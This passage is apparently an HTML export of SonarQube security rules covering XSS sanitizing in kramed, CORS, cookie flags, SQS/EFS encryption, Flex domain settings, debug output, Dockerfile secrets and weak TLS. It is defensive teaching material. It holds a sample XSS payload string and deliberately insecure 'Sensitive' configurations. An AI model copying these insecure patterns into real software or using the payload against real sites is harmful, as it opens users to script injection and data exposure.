<p><a href="https://www.npmjs.com/package/kramed" rel="nofollow">kramed</a> markup language parser:</p>
<pre>
let kramed &#61; require(&#39;kramed&#39;);

let options &#61; {
  renderer: new kramed.Renderer({
    sanitize: true // Compliant
  })
};

console.log(kramed(&#39;Attack [xss?](javascript:alert(&#34;xss&#34;)).&#39;, options));
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.md" rel="nofollow">OWASP Cheat
  Sheet</a> - XSS Prevention Cheat Sheet </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_%28XSS%29" rel="nofollow">OWASP Top 10 2017 Category A7</a> - Cross-Site
  Scripting (XSS) </li><li> <a href="https://cwe.mitre.org/data/definitions/79" rel="nofollow">MITRE, CWE-79</a> - Improper Neutralization of Input During Web Page Generation
  (&#39;Cross-site Scripting&#39;) </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S6330">
              typescript:S6330
            </a>
          </td>
          <td>
            <details>
              <p>Amazon Simple Queue Service (SQS) is a managed message queuing service for application-to-application (A2A) communication. Amazon SQS can store
messages encrypted as soon as they are received. In the case that adversaries gain physical access to the storage medium or otherwise leak a message
from the file system, for example through a vulnerability in the service, they are not able to access the data.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The queue contains sensitive data that could cause harm when leaked. </li><li> There are compliance requirements for the service to store data encrypted. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to encrypt SQS queues that contain sensitive information. Encryption and decryption are handled transparently by SQS, so no
further modifications to the application are necessary.</p>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_sqs.Queue.html" rel="nofollow"><code>aws-cdk-lib.aws-sqs.Queue</code></a></p>
<pre>
import { Queue } from &#39;aws-cdk-lib/aws-sqs&#39;;

new Queue(this, &#39;example&#39;); // Sensitive
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_sqs.CfnQueue.html" rel="nofollow"><code>aws-cdk-lib.aws-sqs.CfnQueue</code></a></p>
<pre>
import { CfnQueue } from &#39;aws-cdk-lib/aws-sqs&#39;;

new CfnQueue(this, &#39;example&#39;); // Sensitive
</pre>
<h2>Compliant Solution</h2>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_sqs.Queue.html" rel="nofollow"><code>aws-cdk-lib.aws-sqs.Queue</code></a></p>
<pre>
import { Queue } from &#39;aws-cdk-lib/aws-sqs&#39;;

new Queue(this, &#39;example&#39;, {
    encryption: QueueEncryption.KMS_MANAGED
});
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_sqs.CfnQueue.html" rel="nofollow"><code>aws-cdk-lib.aws-sqs.CfnQueue</code></a></p>
<pre>
import { CfnQueue } from &#39;aws-cdk-lib/aws-sqs&#39;;

const encryptionKey &#61; new Key(this, &#39;example&#39;, {
    enableKeyRotation: true,
});

new CfnQueue(this, &#39;example&#39;, {
    kmsMasterKeyId: encryptionKey.keyId
});
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/" rel="nofollow">OWASP Top 10 2021 Category A4</a> - Insecure Design </li><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://docs.aws.amazon.com/AWSSimpleQueueService/latest/SQSDeveloperGuide/sqs-server-side-encryption.html" rel="nofollow">AWS Documentation</a> -
  Encryption at rest </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration.html" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://cwe.mitre.org/data/definitions/311" rel="nofollow">MITRE, CWE-311</a> - Missing Encryption of Sensitive Data </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S5122">
              typescript:S5122
            </a>
          </td>
          <td>
            <details>
              <p>Having a permissive Cross-Origin Resource Sharing policy is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2018-0269" rel="nofollow">CVE-2018-0269</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2017-14460" rel="nofollow">CVE-2017-14460</a> </li></ul>
<p><a href="https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy" rel="nofollow">Same origin policy</a> in browsers prevents, by default and for
security-reasons, a javascript frontend to perform a cross-origin HTTP request to a resource that has a different origin (domain, protocol, or port)
from its own. The requested target can append additional HTTP headers in response, called <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS" rel="nofollow">CORS</a>, that act like directives for the browser and change the access control policy
/ relax the same origin policy.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> You don’t trust the origin specified, example: <code>Access-Control-Allow-Origin: untrustedwebsite.com</code>. </li><li> Access control policy is entirely disabled: <code>Access-Control-Allow-Origin: *</code> </li><li> Your access control policy is dynamically defined by a user-controlled input like <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Origin" rel="nofollow"><code>origin</code></a> header. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> The <code>Access-Control-Allow-Origin</code> header should be set only for a trusted origin and for specific resources. </li><li> Allow only selected, trusted domains in the <code>Access-Control-Allow-Origin</code> header. Prefer whitelisting domains over blacklisting or
  allowing any domain (do not use * wildcard nor blindly return the <code>Origin</code> header content without any checks). </li></ul>
<h2>Sensitive Code Example</h2>
<p><a href="https://nodejs.org/api/http.html" rel="nofollow">nodejs http</a> built-in module:</p>
<pre>
const http &#61; require(&#39;http&#39;);
const srv &#61; http.createServer((req, res) &#61;&gt; {
  res.writeHead(200, { &#39;Access-Control-Allow-Origin&#39;: &#39;*&#39; }); // Sensitive
  res.end(&#39;ok&#39;);
});
srv.listen(3000);
</pre>
<p><a href="https://www.npmjs.com/package/express" rel="nofollow">Express.js</a> framework with <a href="https://www.npmjs.com/package/cors" rel="nofollow">cors middleware</a>:</p>
<pre>
const cors &#61; require(&#39;cors&#39;);

let app1 &#61; express();
app1.use(cors()); // Sensitive: by default origin is set to *

let corsOptions &#61; {
  origin: &#39;*&#39; // Sensitive
};

let app2 &#61; express();
app2.use(cors(corsOptions));
</pre>
<p>User-controlled origin:</p>
<pre>
function (req, res) {
  const origin &#61; req.header(&#39;Origin&#39;);
  res.setHeader(&#39;Access-Control-Allow-Origin&#39;, origin); // Sensitive
};
</pre>
<h2>Compliant Solution</h2>
<p><a href="https://nodejs.org/api/http.html" rel="nofollow">nodejs http</a> built-in module:</p>
<pre>
const http &#61; require(&#39;http&#39;);
const srv &#61; http.createServer((req, res) &#61;&gt; {
  res.writeHead(200, { &#39;Access-Control-Allow-Origin&#39;: &#39;trustedwebsite.com&#39; }); // Compliant
  res.end(&#39;ok&#39;);
});
srv.listen(3000);
</pre>
<p><a href="https://www.npmjs.com/package/express" rel="nofollow">Express.js</a> framework with <a href="https://www.npmjs.com/package/cors" rel="nofollow">cors middleware</a>:</p>
<pre>
const cors &#61; require(&#39;cors&#39;);

let corsOptions &#61; {
  origin: &#39;trustedwebsite.com&#39; // Compliant
};

let app &#61; express();
app.use(cors(corsOptions));
</pre>
<p>User-controlled origin validated with an allow-list:</p>
<pre>
function (req, res) {
  const origin &#61; req.header(&#39;Origin&#39;);

  if (trustedOrigins.indexOf(origin) &gt;&#61; 0) {
    res.setHeader(&#39;Access-Control-Allow-Origin&#39;, origin);
  }
};
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/" rel="nofollow">OWASP Top 10 2021 Category A7</a> - Identification and
  Authentication Failures </li><li> <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS" rel="nofollow">developer.mozilla.org</a> - CORS </li><li> <a href="https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy" rel="nofollow">developer.mozilla.org</a> - Same origin policy </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html#cross-origin-resource-sharing" rel="nofollow">OWASP HTML5 Security
  Cheat Sheet</a> - Cross Origin Resource Sharing </li><li> <a href="https://cwe.mitre.org/data/definitions/346" rel="nofollow">MITRE, CWE-346</a> - Origin Validation Error </li><li> <a href="https://cwe.mitre.org/data/definitions/942" rel="nofollow">MITRE, CWE-942</a> - Overly Permissive Cross-domain Whitelist </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S6332">
              typescript:S6332
            </a>
          </td>
          <td>
            <details>
              <p>Amazon Elastic File System (EFS) is a serverless file system that does not require provisioning or managing storage. Stored files can be
automatically encrypted by the service. In the case that adversaries gain physical access to the storage medium or otherwise leak a message they are
not able to access the data.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The file system contains sensitive data that could cause harm when leaked. </li><li> There are compliance requirements for the service to store data encrypted. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to encrypt EFS file systems that contain sensitive information. Encryption and decryption are handled transparently by EFS, so no
further modifications to the application are necessary.</p>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_efs.FileSystem.html" rel="nofollow"><code>aws_cdk.aws_efs.FileSystem</code></a></p>
<pre>
import { FileSystem } from &#39;aws-cdk-lib/aws-efs&#39;;

new FileSystem(this, &#39;unencrypted-explicit&#39;, {
    vpc: new Vpc(this, &#39;VPC&#39;),
    encrypted: false // Sensitive
});
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_efs.CfnFileSystem.html" rel="nofollow"><code>aws_cdk.aws_efs.CfnFileSystem</code></a></p>
<pre>
import { CfnFileSystem } from &#39;aws-cdk-lib/aws-efs&#39;;

new CfnFileSystem(this, &#39;unencrypted-implicit-cfn&#39;, {
}); // Sensitive as encryption is disabled by default
</pre>
<h2>Compliant Solution</h2>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_efs.FileSystem.html" rel="nofollow"><code>aws_cdk.aws_efs.FileSystem</code></a></p>
<pre>
import { FileSystem } from &#39;aws-cdk-lib/aws-efs&#39;;

new FileSystem(this, &#39;encrypted-explicit&#39;, {
    vpc: new Vpc(this, &#39;VPC&#39;),
    encrypted: true
});
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_efs.CfnFileSystem.html" rel="nofollow"><code>aws_cdk.aws_efs.CfnFileSystem</code></a></p>
<pre>
import { CfnFileSystem } from &#39;aws-cdk-lib/aws-efs&#39;;

new CfnFileSystem(this, &#39;encrypted-explicit-cfn&#39;, {
    encrypted: true
});
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/" rel="nofollow">OWASP Top 10 2021 Category A4</a> - Insecure Design </li><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://docs.aws.amazon.com/efs/latest/ug/encryption.html" rel="nofollow">AWS Documentation</a> - Data encryption in Amazon EFS </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration.html" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://cwe.mitre.org/data/definitions/311" rel="nofollow">MITRE, CWE-311</a> - Missing Encryption of Sensitive Data </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S2092">
              typescript:S2092
            </a>
          </td>
          <td>
            <details>
              <p>When a cookie is protected with the <code>secure</code> attribute set to <em>true</em> it will not be send by the browser over an unencrypted HTTP
request and thus cannot be observed by an unauthorized person during a man-in-the-middle attack.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> the cookie is for instance a <em>session-cookie</em> not designed to be sent over non-HTTPS communication. </li><li> it’s not sure that the website contains <a href="https://developer.mozilla.org/en-US/docs/Web/Security/Mixed_content" rel="nofollow">mixed content</a> or not
  (ie HTTPS everywhere or not) </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> It is recommended to use <code>HTTPs</code> everywhere so setting the <code>secure</code> flag to <em>true</em> should be the default behaviour
  when creating cookies. </li><li> Set the <code>secure</code> flag to <em>true</em> for session-cookies. </li></ul>
<h2>Sensitive Code Example</h2>
<p><a href="https://www.npmjs.com/package/cookie-session" rel="nofollow">cookie-session</a> module:</p>
<pre>
let session &#61; cookieSession({
  secure: false,// Sensitive
});  // Sensitive
</pre>
<p><a href="https://www.npmjs.com/package/express-session" rel="nofollow">express-session</a> module:</p>
<pre>
const express &#61; require(&#39;express&#39;);
const session &#61; require(&#39;express-session&#39;);

let app &#61; express();
app.use(session({
  cookie:
  {
    secure: false // Sensitive
  }
}));
</pre>
<p><a href="https://www.npmjs.com/package/cookies" rel="nofollow">cookies</a> module:</p>
<pre>
let cookies &#61; new Cookies(req, res, { keys: keys });

cookies.set(&#39;LastVisit&#39;, new Date().toISOString(), {
  secure: false // Sensitive
}); // Sensitive
</pre>
<p><a href="https://www.npmjs.com/package/csurf" rel="nofollow">csurf</a> module:</p>
<pre>
const cookieParser &#61; require(&#39;cookie-parser&#39;);
const csrf &#61; require(&#39;csurf&#39;);
const express &#61; require(&#39;express&#39;);

let csrfProtection &#61; csrf({ cookie: { secure: false }}); // Sensitive
</pre>
<h2>Compliant Solution</h2>
<p><a href="https://www.npmjs.com/package/cookie-session" rel="nofollow">cookie-session</a> module:</p>
<pre>
let session &#61; cookieSession({
  secure: true,// Compliant
});  // Compliant
</pre>
<p><a href="https://www.npmjs.com/package/express-session" rel="nofollow">express-session</a> module:</p>
<pre>
const express &#61; require(&#39;express&#39;);
const session &#61; require(&#39;express-session&#39;);

let app &#61; express();
app.use(session({
  cookie:
  {
    secure: true // Compliant
  }
}));
</pre>
<p><a href="https://www.npmjs.com/package/cookies" rel="nofollow">cookies</a> module:</p>
<pre>
let cookies &#61; new Cookies(req, res, { keys: keys });

cookies.set(&#39;LastVisit&#39;, new Date().toISOString(), {
  secure: true // Compliant
}); // Compliant
</pre>
<p><a href="https://www.npmjs.com/package/csurf" rel="nofollow">csurf</a> module:</p>
<pre>
const cookieParser &#61; require(&#39;cookie-parser&#39;);
const csrf &#61; require(&#39;csurf&#39;);
const express &#61; require(&#39;express&#39;);

let csrfProtection &#61; csrf({ cookie: { secure: true }}); // Compliant
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/" rel="nofollow">OWASP Top 10 2021 Category A4</a> - Insecure Design </li><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://cwe.mitre.org/data/definitions/311" rel="nofollow">MITRE, CWE-311</a> - Missing Encryption of Sensitive Data </li><li> <a href="https://cwe.mitre.org/data/definitions/315" rel="nofollow">MITRE, CWE-315</a> - Cleartext Storage of Sensitive Information in a Cookie </li><li> <a href="https://cwe.mitre.org/data/definitions/614" rel="nofollow">MITRE, CWE-614</a> - Sensitive Cookie in HTTPS Session Without &#39;Secure&#39; Attribute </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=flex:S1466">
              flex:S1466
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>The Security.exactSettings value should remain set at the default value of true. Setting this value to false could make the SWF vulnerable to
cross-domain attacks.</p>
<h3>Noncompliant code example</h3>
<pre>
Security.exactSettings &#61; false;
</pre>
<h3>Compliant solution</h3>
<pre>
Security.exactSettings &#61; true;
</pre>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=flex:S1465">
              flex:S1465
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>A <code>LocalConnection</code> object is used to invoke a method in another <code>LocalConnection</code> object, either within a single SWF file or
between multiple SWF files. This kind of local connection should be authorized only when the origin (domain) of the other Flex applications is
perfectly defined.</p>
<h3>Noncompliant code example</h3>
<pre>
localConnection.allowDomain(&#34;*&#34;);
</pre>
<h3>Compliant solution</h3>
<pre>
localConnection.allowDomain(&#34;www.myDomain.com&#34;);
</pre>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=flex:S1468">
              flex:S1468
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Calling Security.allowDomain(&#34;*&#34;) lets any domain cross-script into the domain of this SWF and exercise its functionality.</p>
<h3>Noncompliant code example</h3>
<pre>
Security.allowDomain(&#34;*&#34;);
</pre>
<h3>Compliant solution</h3>
<pre>
Security.allowDomain(&#34;www.myDomain.com&#34;);
</pre>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=flex:S1951">
              flex:S1951
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated; use <a href="/organizations/sopra-steria/rules?open&#61;flex%3AS4507&amp;rule_key&#61;flex%3AS4507" rel="nofollow">S4507</a> instead.</p>
<h2>Why is this an issue?</h2>
<p>The <code>trace()</code> function outputs debug statements, which can be read by anyone with a debug version of the Flash player. Because sensitive
information could easily be exposed in this manner, <code>trace()</code> should never appear in production code.</p>
<h3>Noncompliant code example</h3>
<pre>
    var val:Number &#61; doCalculation();
    trace(&#34;Calculation result: &#34; &#43; val);  // Noncompliant
</pre>
<h3>Compliant solution</h3>
<pre>
    var val:Number &#61; doCalculation();
</pre>
<h2>Resources</h2>
<ul><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://cwe.mitre.org/data/definitions/489" rel="nofollow">MITRE, CWE-489</a> - Active Debug Code </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=flex:S4507">
              flex:S4507
            </a>
          </td>
          <td>
            <details>
              <p>Development tools and frameworks usually have options to make debugging easier for developers. Although these features are useful during
development, they should never be enabled for applications deployed in production. Debug instructions or error messages can leak detailed information
about the system, like the application’s path or file names.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The code or configuration enabling the application debug features is deployed on production servers or distributed to end users. </li><li> The application runs by default with debug features activated. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Do not enable debugging features on production servers or applications distributed to end users.</p>
<h2>Sensitive Code Example</h2>
<pre>
if (unexpectedCondition)
{
  Alert.show(&#34;Unexpected Condition&#34;); // Sensitive
}
</pre>
<p>The <code>trace()</code> function outputs debug statements, which can be read by anyone with a debug version of the Flash player:</p>
<pre>
var val:Number &#61; doCalculation();
trace(&#34;Calculation result: &#34; &#43; val);  // Sensitive
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://cwe.mitre.org/data/definitions/489" rel="nofollow">MITRE, CWE-489</a> - Active Debug Code </li><li> <a href="https://cwe.mitre.org/data/definitions/215" rel="nofollow">MITRE, CWE-215</a> - Information Exposure Through Debug Information </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=flex:S1442">
              flex:S1442
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated; use <a href="/organizations/sopra-steria/rules?open&#61;flex%3AS4507&amp;rule_key&#61;flex%3AS4507" rel="nofollow">S4507</a> instead.</p>
<h2>Why is this an issue?</h2>
<p><code>Alert.show(...)</code> can be useful for debugging during development, but in production mode this kind of pop-up could expose sensitive
information to attackers, and should never be displayed.</p>
<h3>Noncompliant code example</h3>
<pre>
if (unexpectedCondition)
{
  Alert.show(&#34;Unexpected Condition&#34;);
}
</pre>
<h2>Resources</h2>
<ul><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://cwe.mitre.org/data/definitions/489" rel="nofollow">MITRE, CWE-489</a> - Active Debug Code </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=docker:S6437">
              docker:S6437
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Sensitive data has been found in the Dockerfile or Docker image. The data should be considered breached.</p>
<p>If malicious third parties can get a hold of such information, they could impersonate legitimate identities within the organization.<br /> It is a
clear breach of trust in the system, as the systems involved falsely assume that the authenticated entity is who it claims to be.<br /> The consequences
can be catastrophic.</p>
<p>In Dockerfiles, secrets hard-coded, secrets passed through as variables or created at build-time will cause security risks. The secret information
can be exposed either via the container environment itself, the image metadata or the build environment logs.</p>
<p>Docker Buildkit’s secret mount options should be used when secrets have to be accessed at build time. For run-time secrets, best practices would
recommend only setting them at runtime, for example with the <code>--env</code> option of the docker run command.</p>
<p>Note that files exposing the secrets should be securely stored and not exposed to a large sphere. If possible, use a secret vault or another
similar component. For example, <strong>Docker Swarm</strong> provides a <strong>secrets</strong> service that can be used to handle most confidential
data.</p>
<h3>Noncompliant code example</h3>
<pre>
FROM example
ARG PASSWORD
# Noncompliant
RUN wget --user&#61;guest --password&#61;&#34;$PASSWORD&#34; https://example.com
</pre>
<h3>Compliant solution</h3>
<p>For build-time secrets, use <a href="https://docs.docker.com/engine/reference/builder/#run---mounttypesecret" rel="nofollow">Buildkit’s secret mount type</a>
instead:</p>
<pre>
FROM example
RUN --mount&#61;type&#61;secret,id&#61;build_secret \
    wget --user&#61;guest --password&#61;$(cat /run/secrets/build_secret) https://example.com
</pre>
<p>For runtime secrets, leave the environment variables empty until runtime:</p>
<pre>
FROM example
ENV ACCESS_TOKEN&#61;&#34;&#34;
CMD /run.sh
</pre>
<p>Store the runtime secrets in an <a href="https://docs.docker.com/compose/env-file/" rel="nofollow">environment file</a> (such as <code>.env</code>) and then start
the container with the <a href="https://docs.docker.com/engine/reference/commandline/run/#set-environment-variables—​e---env---env-file" rel="nofollow"><code>--env-file</code></a>
argument:</p>
<pre>
docker run --env-file .env myImage
</pre>
<h2>Resources</h2>
<ul><li> <a href="https://docs.docker.com/engine/reference/builder/#run---mounttypesecret" rel="nofollow">Dockerfile reference</a> - RUN command secrets mount points
  </li><li> <a href="https://docs.docker.com/engine/swarm/secrets/" rel="nofollow">Docker documentation</a> - Manage sensitive data with Docker secrets </li><li> <a href="https://cwe.mitre.org/data/definitions/522.html" rel="nofollow">MITRE, CWE-522</a> - Insufficiently Protected Credentials </li><li> <a href="https://cwe.mitre.org/data/definitions/798.html" rel="nofollow">MITRE, CWE-798</a> - Use of Hard-coded Credentials </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=docker:S4423">
              docker:S4423
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability exposes encrypted data to a number of attacks whose goal is to recover the plaintext.</p>
<h2>Why is this an issue?</h2>
<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communications in a variety of domains. They are used
for several important reasons:</p>
<ul><li> Confidentiality, privacy, and intellectual property protection </li><li> Security during transmission or on storage devices </li><li> Data integrity, general trust, and authentication </li></ul>
<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>
<ol><li> No encryption is unbreakable. </li><li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li></ol>
<p>For these reasons, as soon as cryptography is included in a project, it is important to choose encryption algorithms that are considered strong and
secure by the cryptography community.</p>
<p>To provide communication security over a network, SSL and TLS are generally used. However, it is important to note that the following protocols are
all considered weak by the cryptographic community, and are officially deprecated:</p>
<ul><li> SSL versions 1.0, 2.0 and 3.0 </li><li> TLS versions 1.0 and 1.1 </li></ul>
<p>When these unsecured protocols are used, it is best practice to expect a breach: that a user or organization with malicious intent will perform
mathematical attacks on this data after obtaining it by other means.</p>
<h3>What is the potential impact?</h3>
<p>After retrieving encrypted data and performing cryptographic attacks on it on a given timeframe, attackers can recover the plaintext that
encryption was supposed to protect.</p>
<p>Depending on the recovered data, the impact may vary.</p>
<p>Below are some real-world scenarios that illustrate the potential impact of an attacker exploiting the vulnerability.</p>
<h4>Additional attack surface</h4>
<p>By modifying the plaintext of the encrypted message, an attacker may be able to trigger additional vulnerabilities in the code. An attacker can
further exploit a system to obtain more information.<br /> Encrypted values are often considered trustworthy because it would not be possible for a
third party to modify them under normal circumstances.</p>
<h4>Breach of confidentiality and privacy</h4>
<p>When encrypted data contains personal or sensitive information, its retrieval by an attacker can lead to privacy violations, identity theft,
financial loss, reputational damage, or unauthorized access to confidential systems.</p>
<p>In this scenario, the company, its employees, users, and partners could be seriously affected.</p>
<p>The impact is twofold, as data breaches and exposure of encrypted data can undermine trust in the organization, as customers, clients and
stakeholders may lose confidence in the organization’s ability to protect their sensitive data.</p>
<h4>Legal and compliance issues</h4>
<p>In many industries and locations, there are legal and compliance requirements to protect sensitive data. If encrypted data is compromised and the
plaintext can be recovered, companies face legal consequences, penalties, or violations of privacy laws.</p>
<h2>How to fix it in cURL</h2>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
FROM ubuntu:22.04

# Noncompliant
RUN curl --tlsv1.0 -O https://tlsv1-0.example.com/downloads/install.sh
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
FROM ubuntu:22.04

RUN curl --tlsv1.2 -O https://tlsv1-3.example.com/downloads/install.sh
</pre>
<h3>How does this work?</h3>
<p>As a rule of thumb, by default you should use the cryptographic algorithms and mechanisms that are considered strong by the cryptographic
community.</p>
<p>The best choices at the moment are the following.</p>
<h4>Use TLS v1.2 or TLS v1.3</h4>
<p>Even though TLS V1.3 is available, using TLS v1.2 is still considered good and secure practice by the cryptography community.<br /></p>
<p>The use of TLS v1.2 ensures compatibility with a wide range of platforms and enables seamless communication between different systems that do not
yet have TLS v1.3 support.</p>
<p>The only drawback depends on whether the framework used is outdated: its TLS v1.2 settings may enable older and insecure cipher suites that are
deprecated as insecure.</p>
<p>On the other hand, TLS v1.3 removes support for older and weaker cryptographic algorithms, eliminates known vulnerabilities from previous TLS
versions, and improves performance.</p>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
